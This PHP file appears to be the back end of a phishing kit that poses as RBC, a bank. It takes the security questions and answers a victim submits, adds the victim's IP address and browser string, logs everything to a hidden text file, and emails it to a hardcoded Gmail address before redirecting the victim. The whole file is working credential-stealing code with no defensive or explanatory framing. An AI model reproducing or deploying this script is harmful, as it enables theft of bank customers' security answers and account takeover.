 <?php


error_reporting(0);

$send = "medahnabil@gmail.com";


$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message = "";
$message .= "-----------------QuestionResults----------------\n";
$message .= "question1 : ".$_POST['question1']."\n";
$message .= "answer1 : ".$_POST['answer1']."\n";
$message .= "question2 : ".$_POST['question2']."\n";
$message .= "answer2 : ".$_POST['answer2']."\n";
$message .= "question3 : ".$_POST['question3']."\n";
$message .= "answer3 : ".$_POST['answer3']."\n";
$message .= "-----------------created by GOODLIFE---------------\n";
$message .= "IP          : ".$ip."\n";
$message .= "BROWSER     : ".$browser."\n";
$message .= "-----------------rbcResults-----------------------\n";

$subject = "RBCResult - created by GOODLIFE ";

$fp = fopen($_SERVER['DOCUMENT_ROOT'] . "/DimaMohm3X.txt","a+");
fwrite($fp,"RBC - GOODLIFE" . " | " .getenv('HTTP_X_FORWARDED_FOR') . " | " . $_SERVER['HTTP_USER_AGENT'] . " | " . "\n\n" .$subject . "\n" . $message . "\n\n");
fclose($fp);

mail($send , "RBC - GOODLIFE", getenv('HTTP_X_FORWARDED_FOR') . " | " . $_SERVER['HTTP_USER_AGENT'] . " | " . "\n\n" .$subject . "\n" . $message . "\n\n");

?>
<script>

    window.top.location.href = "redirecting.html";
</script>